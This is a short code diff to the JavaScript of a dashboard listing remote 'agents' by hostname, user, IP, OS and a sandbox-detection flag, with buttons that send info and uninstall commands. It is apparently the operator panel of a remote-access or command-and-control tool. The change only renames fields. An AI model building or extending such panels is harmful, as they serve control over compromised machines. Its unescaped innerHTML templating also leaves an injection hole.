@@ -2040,20 +2040,20 @@
             }
 
             tbody.innerHTML = agents.map(a => `
-        <tr class="agent-row ${selectedAgentId === a.session_id ? 'selected' : ''}" onclick="selectAgent('${a.session_id}')">
-            <td><input type="checkbox" class="agent-check" value="${a.session_id}" onclick="event.stopPropagation()"></td>
+        <tr class="agent-row ${selectedAgentId === (a.sessionId || a.session_id) ? 'selected' : ''}" onclick="selectAgent('${a.sessionId || a.session_id}')">
+            <td><input type="checkbox" class="agent-check" value="${a.sessionId || a.session_id}" onclick="event.stopPropagation()"></td>
             <td><strong>${a.hostname || 'Unknown'}</strong></td>
             <td>${a.username || '—'}</td>
-            <td class="mono">${a.internal_ip || '—'}</td>
+            <td class="mono">${a.ip || a.internal_ip || '—'}</td>
             <td>${a.os ? a.os.substring(0, 35) : '—'}</td>
             <td>${getStatusBadge(a)}</td>
             <td>${a.sandbox_detected ? '<span class="tag red">⚠️</span>' : '<span class="tag green">✓</span>'}</td>
             <td><span class="tag purple">${a.group || 'Default'}</span></td>
-            <td>${formatDate(a.last_seen || a.timestamp)}</td>
+            <td>${formatDate(a.lastHeartbeat?._seconds ? a.lastHeartbeat._seconds * 1000 : a.timestamp)}</td>
             <td class="mono">${a.commands_count || 0}</td>
             <td>
-                <button class="btn btn-sm" onclick="event.stopPropagation();sendCommand('info', '${a.session_id}')">📋</button>
-                <button class="btn btn-sm btn-danger" onclick="event.stopPropagation();sendCommand('uninstall', '${a.session_id}')">🗑️</button>
+                <button class="btn btn-sm" onclick="event.stopPropagation();sendCommand('info', '${a.sessionId || a.session_id}')">📋</button>
+                <button class="btn btn-sm btn-danger" onclick="event.stopPropagation();sendCommand('uninstall', '${a.sessionId || a.session_id}')">🗑️</button>
             </td>
         </tr>
     `).join('');
